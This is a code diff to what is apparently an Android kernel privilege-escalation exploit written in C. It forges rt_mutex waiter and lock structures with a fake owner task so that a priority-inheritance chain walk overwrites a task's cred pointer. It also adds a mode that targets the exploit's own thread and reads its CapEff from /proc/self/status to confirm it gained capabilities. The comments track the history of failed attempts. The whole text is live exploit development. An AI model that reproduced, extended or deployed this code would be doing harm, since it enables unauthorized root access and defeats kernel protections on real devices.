@@ -433,7 +433,14 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
            * *(task+0x780) = child(word2) — task->cred = VALUE, exactly
            * the DUAL target. word7 lock = self-lock; root=leftmost=ghost
            * passes the top->lock==lock EQUAL gate into the erase. */
-          g_main_pc = ((uint64_t)(g_child_task + 0x778)) | 1ULL;
+          /* MODE4_TARGET_WAITER: deliver to the WAITER task (self-leak
+           * 154 votes STRONG) instead of the child (36 votes — weak:
+           * jc41/jc42 wrote a possibly-wrong task's +0x780). The waiter
+           * thread verifies its OWN CapEff post-punch. */
+          uintptr_t tgt_task = g_child_task;
+          if (env_flag("MODE4_TARGET_WAITER", 0))
+            tgt_task = jc2_self_task_leak();
+          g_main_pc = ((uint64_t)(tgt_task + 0x778)) | 1ULL;
           g_main_left = (uint64_t)g_child_cred;
           pr_info("JC2 CAPSONLY v2 CC: pc=%016llx (task+0x778|RED) "
                   "left=%016llx (VALUE=cred)\n",
@@ -542,10 +549,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
          * zero band → clean gate exit, never a qspinlock hang (the jc28
          * wedge class). Only the exact delta roots the tree at the ghost. */
         ghost_lock_word = g_ghost_kva + 0x50;
-        ex_stamp[0] = 0;            /* word20 wait_lock: unlocked      */
-        ex_stamp[1] = g_ghost_kva;  /* word21 waiters root = ghost     */
-        ex_stamp[2] = g_ghost_kva;  /* word22 waiters leftmost = ghost */
-        ex_stamp[3] = 1;            /* word23 owner = NULL|HAS_WAITERS */
+        ex_stamp[0] = 0;            /* word10 wait_lock: unlocked      */
+        ex_stamp[1] = g_ghost_kva;  /* word11 waiters root = ghost     */
+        ex_stamp[2] = g_ghost_kva;  /* word12 waiters leftmost = ghost */
+        /* owner MUST be >1: the chain exits at owner<=1 BEFORE the
+         * delivery erase (historic util.c note: "exits at owner<=1
+         * (0x1ee2cc)"). fake_task|1 = the MODE4_OWNER_TASK-proven shape:
+         * the walk enters fake_task (page, pi_blocked_on=0) and the
+         * chain ends AFTER the erase/requeue. owner=1 was the jc37-jc41
+         * no-delivery cause. */
+        ex_stamp[3] = ((uint64_t)fake_task) | 1ULL;
         ghost_self_lock = 1;
       }
       struct pselect_waiter_word jc2_words[] = {
@@ -2767,6 +2780,23 @@ void do_pselect_fake_lock_route(void) {
     int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
     int saved_errno = errno;
     pr_info("pselect post-select +%.0fms ret=%d\n", fops_elapsed_ms(&route_t0), ret);
+    /* WAITER SELF-VERIFICATION (delivery readback): this thread is the
+     * punch target under MODE4_TARGET_WAITER — if the erase delivered,
+     * OUR OWN CapEff changed. Direct, no child-task dependency. */
+    if (env_flag("MODE4_TARGET_WAITER", 0)) {
+      int sf = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
+      if (sf >= 0) {
+        static char sb[2048];
+        ssize_t sn = read(sf, sb, sizeof(sb) - 1);
+        close(sf);
+        if (sn > 0) {
+          sb[sn] = 0;
+          char *ce = strstr(sb, "CapEff:");
+          if (ce)
+            pr_info("WAITER CapEff=%.18s (delivery readback)\n", ce + 7);
+        }
+      }
+    }
     {
       int sfd = open("/data/local/tmp/stage.txt",
                      O_WRONLY | O_CREAT | O_APPEND, 0644);
